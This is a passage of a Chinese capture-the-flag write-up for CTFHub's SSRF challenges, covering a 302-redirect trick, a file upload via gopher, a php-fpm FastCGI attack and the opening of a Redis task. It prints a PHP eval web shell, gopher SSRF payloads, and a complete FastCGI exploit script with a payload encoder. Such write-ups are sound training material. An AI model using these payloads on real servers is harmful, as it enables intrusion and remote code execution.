class="hljs-keyword">x</span>-www-form-urlencoded%250d%250aContent-Length%<span class="hljs-number">3</span>A%2036%250d%250a%250d%250akey%3D5e37e6b3f645b286834aabb8a49dac71
+</code></pre></code-box>
+<p>题目给了提示，<code>curl</code>会跟踪302跳转，这个点主要用于参数长度或内容有限制的时候，可以通过302跳转来实现ssrf。例如，限制了url长度，那么可以在自己的vps或者靶机上，上传构造好的（<code>Location: gopher://xxxxxxxx</code>）跳转页面，然后直接访问跳转页面，即可实现ssrf。</p>
+</li>
+</ul>
+<h2 id="tid-aRy7dn" tid="tid-aRy7dn">5.上传文件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>这次需要上传一个文件到flag.php了.我准备了个302.php可能会有用.祝你好运</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=file:///var/www/html/flag.php</code>查看flag代码</p>
+<code-box id="code-aYXejT"><button boxid="code-aYXejT" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-aYXejT pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-aYXejT" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>] != <span class="hljs-string">"127.0.0.1"</span>){
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just View From 127.0.0.1"</span>;
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>] ){
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">"CTFHUB"</span>);
+    <span class="hljs-keyword">exit</span>;
+}
+<span class="hljs-meta">?&gt;</span>
+</code></pre></code-box>
+<p>自行在form表单中添加提交按钮<code>&lt;input type="submit" value="提交"&gt;</code></p>
+<p>用burp抓包</p>
+<p><a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205236284-98717363.png"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205236284-98717363.png"></a></p>
+<p>修改后：</p>
+<code-box id="code-CRPdF7"><button boxid="code-CRPdF7" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-CRPdF7 pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-http" highlighted="true" boxid="code-CRPdF7" style="background: rgb(245, 245, 250);"><code class="language-http highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge-0787aada7abf3fe4.sandbox.ctfhub.com:10080
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>222
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge-0787aada7abf3fe4.sandbox.ctfhub.com:10080
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryFq9cC6PrPMDmf6JG
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
+<span class="language-php">------WebKitFormBoundaryFq9cC6PrPMDmf6JG
+Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"draft.php"</span>
+Content-Type: application/octet-stream
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x]); <span class="hljs-meta">?&gt;</span>
+------WebKitFormBoundaryFq9cC6PrPMDmf6JG--
+</span></code></pre></code-box>
+<p>改为ssrf</p>
+<code-box id="code-rDpw2P"><button boxid="code-rDpw2P" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-rDpw2P pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs" highlighted="true" boxid="code-rDpw2P" style="background: rgb(245, 245, 250);"><code class="highlighter-hljs hljs language-perl" style="background: none; border: 0px; border-radius: 0px; padding: 0px;">?url=gopher:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/_POST%20/flag.php%20HTTP/<span class="hljs-number">1.1</span>%250D%250AHost%253A%2520challenge-<span class="hljs-number">07</span>87aada7abf3fe4.sandbox.ctfhub.com%253A1008<span class="hljs-number">0</span>%250D%250AContent-Length%253A%2520222%250D%250ACache-Control%253A%2520max-age%253D<span class="hljs-number">0</span>%250D%250AOrigin%253A%2520http%253A//challenge-<span class="hljs-number">07</span>87aada7abf3fe4.sandbox.ctfhub.com%253A1008<span class="hljs-number">0</span>%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryFq9cC6PrPMDmf6JG%250D%250AUser-Agent%253A%2520Mozilla/<span class="hljs-number">5.0</span>%252<span class="hljs-number">0</span>%250D%250AAccept%253A%252<span class="hljs-number">0</span>%252A/%252A%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.<span class="hljs-number">9</span>%252Cen%253Bq%253D0.<span class="hljs-number">8</span>%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryFq9cC6PrPMDmf6JG%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522draft.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bx%255D%2529%253B%252<span class="hljs-number">0</span>%253F%253E%250D%250A------WebKitFormBoundaryFq9cC6PrPMDmf6JG--
+</code></pre></code-box>
+<p>直接访问就给flag了</p>
+</li>
+</ul>
+<h2 id="tid-nDncbf" tid="tid-nDncbf">6.FastCGI协议<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</p>
+<p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="noopener">附件</a></p>
+</li>
+<li>
+<p>解题过程</p>
+<p><a href="https://www.cnblogs.com/R3col/p/14122692.html" target="_blank" rel="noopener">浅略分析</a></p>
+<p>这道题坑有点多 = =，反复做了好几次才成功 ，主要有几点：</p>
+<ul>
+<li>
+<p>题目附件中的exp是使用fastcgi协议发送报文的，是直接向php-fpm（9000端口）发送的，外网不能访问到该端口，不能直接拿来打题目url</p>
+<ul>
+<li>所以要自己手动获取fastcgi发送的报文，然后利用gopher进行内网访问9000端口的fpm</li>
+</ul>
+</li>
+<li>
+<p>需要使用hex编码来构造payload，而hexdump在x86环境下是小端显示（就是地址位低的字节在前）</p>
+</li>
+<li>
+<p>hex编码后的payload需要转换位url编码，然后再次url编码（一共两次url编码）</p>
+</li>
+<li>
+<p>步骤（我是在kali虚拟机上完成的）</p>
+<ul>
+<li>
+<p>监听端口（可以不用9000，可以随意更换，但是在下面的exp里也要修改对应端口），使用hexdump的大端显示模式，把结果存到<code>1.txt</code></p>
+<ul>
+<li><code>nc -lvvp 9000 | hexdump -C &gt; 1.txt</code></li>
+</ul>
+</li>
+<li>
+<p>执行exp</p>
+<ul>
+<li>
+<p><code>python exp.py -c "&lt;?php var_dump(system('ls /')); ?&gt;" -p 9000 0.0.0.0 /var/www/html/index.php</code></p>
+</li>
+<li>
+<p>用法<code>python exp.py -c php代码 -p php-fpm端口 ip 任意php文件的绝对路径</code></p>
+</li>
+<li>
+<p>这里我们是要自己向自己的端口访问，来获取请求报文，所以端口可以任意设置</p>
+</li>
+<li>
+<p>exp脚本（p神yyds！）</p>
+<ul>
+<li>
+<code-box id="code-8XyfGy"><button boxid="code-8XyfGy" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-8XyfGy pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-python" highlighted="true" boxid="code-8XyfGy" style="background: rgb(245, 245, 250);"><code class="language-python highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO
+
+<span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>
+
+PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span>
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):
+    <span class="hljs-keyword">if</span> PY2:
+        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):
+        <span class="hljs-keyword">return</span> c
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):
+        <span class="hljs-keyword">return</span> s
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">'utf-8'</span>, <span class="hljs-string">'strict'</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):
+        <span class="hljs-keyword">return</span> s
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):
+        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">'utf-8'</span>, <span class="hljs-string">'strict'</span>)
+    <span class="hljs-keyword">else</span>:
+        s = <span class="hljs-built_in">str</span>(s)
+    <span class="hljs-keyword">return</span> s
+
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:
+    <span class="hljs-string">"""A Fast-CGI Client for Python"""</span>
+
+    <span class="hljs-comment"># private</span>
+    __FCGI_VERSION = <span class="hljs-number">1</span>
+
+    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span>
+    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span>
+    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span>
+
+    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span>
+    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span>
+    __FCGI_TYPE_END = <span class="hljs-number">3</span>
+    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span>
+    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span>
+    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span>
+    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span>
+    __FCGI_TYPE_DATA = <span class="hljs-number">8</span>
+    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span>
+    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span>
+    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span>
+
+    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span>
+
+    <span class="hljs-comment"># request state</span>
+    FCGI_STATE_SEND = <span class="hljs-number">1</span>
+    FCGI_STATE_ERROR = <span class="hljs-number">2</span>
+    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        <span class="hljs-keyword">if</span> keepalive:
+            self.keepalive = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            self.keepalive = <span class="hljs-number">0</span>
+        self.sock = <span class="hljs-literal">None</span>
+        self.requests = <span class="hljs-built_in">dict</span>()
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
+        <span class="hljs-comment"># if self.keepalive:</span>
+        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>
+        <span class="hljs-comment"># else:</span>
+        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>
+        <span class="hljs-keyword">try</span>:
+            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))
+        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:
+            self.sock.close()
+            self.sock = <span class="hljs-literal">None</span>
+            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):
+        length = <span class="hljs-built_in">len</span>(content)
+        buf = bchr(FastCGIClient.__FCGI_VERSION) \
+               + bchr(fcgi_type) \
+               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
+               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \
+               + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
+               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \
+               + bchr(<span class="hljs-number">0</span>) \
+               + bchr(<span class="hljs-number">0</span>) \
+               + content
+        <span class="hljs-keyword">return</span> buf
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):
+        nLen = <span class="hljs-built_in">len</span>(name)
+        vLen = <span class="hljs-built_in">len</span>(value)
+        record = <span class="hljs-string">b''</span>
+        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:
+            record += bchr(nLen)
+        <span class="hljs-keyword">else</span>:
+            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \
+                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \
+                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
+                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)
+        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:
+            record += bchr(vLen)
+        <span class="hljs-keyword">else</span>:
+            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \
+                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \
+                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
+                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)
+        <span class="hljs-keyword">return</span> record + name + value
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):
+        header = <span class="hljs-built_in">dict</span>()
+        header[<span class="hljs-string">'version'</span>] = bord(stream[<span class="hljs-number">0</span>])
+        header[<span class="hljs-string">'type'</span>] = bord(stream[<span class="hljs-number">1</span>])
+        header[<span class="hljs-string">'requestId'</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])
+        header[<span class="hljs-string">'contentLength'</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])
+        header[<span class="hljs-string">'paddingLength'</span>] = bord(stream[<span class="hljs-number">6</span>])
+        header[<span class="hljs-string">'reserved'</span>] = bord(stream[<span class="hljs-number">7</span>])
+        <span class="hljs-keyword">return</span> header
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):
+        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))
+
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">else</span>:
+            record = self.__decodeFastCGIHeader(header)
+            record[<span class="hljs-string">'content'</span>] = <span class="hljs-string">b''</span>
+
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'contentLength'</span> <span class="hljs-keyword">in</span> record.keys():
+                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">'contentLength'</span>])
+                record[<span class="hljs-string">'content'</span>] += buffer.read(contentLength)
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'paddingLength'</span> <span class="hljs-keyword">in</span> record.keys():
+                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">'paddingLength'</span>]))
+            <span class="hljs-keyword">return</span> record
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs={}, post=<span class="hljs-string">''</span></span>):
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">'connect failure! please check your fasctcgi-server !!'</span>)
+            <span class="hljs-keyword">return</span>
+
+        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)
+        self.requests[requestId] = <span class="hljs-built_in">dict</span>()
+        request = <span class="hljs-string">b""</span>
+        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \
+                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+                                 + bchr(self.keepalive) \
+                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
+                                              beginFCGIRecordContent, requestId)
+        paramsRecord = <span class="hljs-string">b''</span>
+        <span class="hljs-keyword">if</span> nameValuePairs:
+            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():
+                name = force_bytes(name)
+                value = force_bytes(value)
+                paramsRecord += self.__encodeNameValueParams(name, value)
+
+        <span class="hljs-keyword">if</span> paramsRecord:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b''</span>, requestId)
+
+        <span class="hljs-keyword">if</span> post:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b''</span>, requestId)
+
+        self.sock.send(request)
+        self.requests[requestId][<span class="hljs-string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND
+        self.requests[requestId][<span class="hljs-string">'response'</span>] = <span class="hljs-string">b''</span>
+        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):
+        data = <span class="hljs-string">b''</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+            buf = self.sock.recv(<span class="hljs-number">512</span>)
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):
+                <span class="hljs-keyword">break</span>
+            data += buf
+
+        data = BytesIO(data)
+        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+            response = self.__decodeFastCGIRecord(data)
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:
+                <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \
+                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:
+                <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:
+                    self.requests[<span class="hljs-string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR
+                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">'requestId'</span>]):
+                    self.requests[requestId][<span class="hljs-string">'response'</span>] += response[<span class="hljs-string">'content'</span>]
+            <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:
+                self.requests[requestId]
+        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">'response'</span>]
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"fastcgi connect host:{} port:{}"</span>.<span class="hljs-built_in">format</span>(self.host, self.port)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    parser = argparse.ArgumentParser(description=<span class="hljs-string">'Php-fpm code execution vulnerability client.'</span>)
+    parser.add_argument(<span class="hljs-string">'host'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'Target host, such as 127.0.0.1'</span>)
+    parser.add_argument(<span class="hljs-string">'file'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)
+    parser.add_argument(<span class="hljs-string">'-c'</span>, <span class="hljs-string">'--code'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'What php code your want to execute'</span>, default=<span class="hljs-string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)
+    parser.add_argument(<span class="hljs-string">'-p'</span>, <span class="hljs-string">'--port'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'FastCGI port'</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)
+
+    args = parser.parse_args()
+
+    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)
+    params = <span class="hljs-built_in">dict</span>()
+    documentRoot = <span class="hljs-string">"/"</span>
+    uri = args.file
+    content = args.code
+    params = {
+        <span class="hljs-string">'GATEWAY_INTERFACE'</span>: <span class="hljs-string">'FastCGI/1.0'</span>,
+        <span class="hljs-string">'REQUEST_METHOD'</span>: <span class="hljs-string">'POST'</span>,
+        <span class="hljs-string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="hljs-string">'/'</span>),
+        <span class="hljs-string">'SCRIPT_NAME'</span>: uri,
+        <span class="hljs-string">'QUERY_STRING'</span>: <span class="hljs-string">''</span>,
+        <span class="hljs-string">'REQUEST_URI'</span>: uri,
+        <span class="hljs-string">'DOCUMENT_ROOT'</span>: documentRoot,
+        <span class="hljs-string">'SERVER_SOFTWARE'</span>: <span class="hljs-string">'php/fcgiclient'</span>,
+        <span class="hljs-string">'REMOTE_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+        <span class="hljs-string">'REMOTE_PORT'</span>: <span class="hljs-string">'9985'</span>,
+        <span class="hljs-string">'SERVER_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+        <span class="hljs-string">'SERVER_PORT'</span>: <span class="hljs-string">'80'</span>,
+        <span class="hljs-string">'SERVER_NAME'</span>: <span class="hljs-string">"localhost"</span>,
+        <span class="hljs-string">'SERVER_PROTOCOL'</span>: <span class="hljs-string">'HTTP/1.1'</span>,
+        <span class="hljs-string">'CONTENT_TYPE'</span>: <span class="hljs-string">'application/text'</span>,
+        <span class="hljs-string">'CONTENT_LENGTH'</span>: <span class="hljs-string">"%d"</span> % <span class="hljs-built_in">len</span>(content),
+        <span class="hljs-string">'PHP_VALUE'</span>: <span class="hljs-string">'auto_prepend_file = php://input'</span>,
+        <span class="hljs-string">'PHP_ADMIN_VALUE'</span>: <span class="hljs-string">'allow_url_include = On'</span>
+    }
+    response = client.request(params, content)
+
+</code></pre></code-box>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>处理请求报文</p>
+<ul>
+<li>
+<p>我在参考里的脚本上添加了一些处理的代码，来过滤<code>hexdump -C</code>的对照信息，然后转换成url编码格式</p>
+</li>
+<li>
+<code-box id="code-EFmP7P"><button boxid="code-EFmP7P" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-EFmP7P pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-python" highlighted="true" boxid="code-EFmP7P" style="background: rgb(245, 245, 250);"><code class="language-python highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-keyword">import</span> urllib
+
+<span class="hljs-comment"># 打开报文</span>
+file = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/kali/1.txt"</span>,<span class="hljs-string">"r"</span>)
+content = file.readlines()
+<span class="hljs-comment"># 读取报文，去除对照信息</span>
+str_ = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> content:
+    str_ += line[<span class="hljs-number">8</span>:-<span class="hljs-number">20</span>]
+<span class="hljs-comment"># 去除空格和换行符</span>
+str_dealed = str_.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">" "</span>, <span class="hljs-string">""</span>)
+<span class="hljs-comment"># 转换为url编码形式</span>
+payload = <span class="hljs-string">""</span>
+length = <span class="hljs-built_in">len</span>(str_dealed)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">2</span>):
+    temp = <span class="hljs-string">"%"</span> + str_dealed[i] + str_dealed[i+<span class="hljs-number">1</span>]
+    payload += temp
+<span class="hljs-comment"># 再次url编码</span>
+<span class="hljs-built_in">print</span>(urllib.quote(payload))
+</code></pre></code-box>
+</li>
+</ul>
+</li>
+<li>
+<p>拼接payload</p>
+<ul>
+<li><code>http://challenge-id.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:9000/_payload</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>参考</p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/108589988" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/108589988</a></p>
+<p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="noopener">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>
+</li>
+</ul>
+<h2 id="tid-ZFsxpH" tid="tid-ZFsxpH">7.Redis<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=file:///var/www/html/index.php</code></p>
